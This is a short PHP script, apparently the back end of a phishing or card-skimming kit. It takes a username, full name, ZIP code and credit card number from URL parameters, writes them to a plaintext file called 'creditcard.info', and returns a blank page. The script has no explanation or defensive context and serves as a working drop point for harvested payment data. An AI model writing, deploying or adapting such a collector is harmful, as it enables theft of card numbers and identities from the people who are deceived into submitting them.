<?php

$uname  = $_GET['USERNAME'];
$flname = $_GET['FIRSTLASTNAME'];
$Z = $_GET['ZIP'];
$cc = $_GET['CREDITCARD'];

$file = fopen('creditcard.info', 'w');
fwrite($file, $uname . "\t");
fwrite($file, $flname . "\t");
fwrite($file, $Z . "\t");
fwrite($file, $cc . "\n");

fclose($file);

?>

<html>
<body>
</body>
</html>
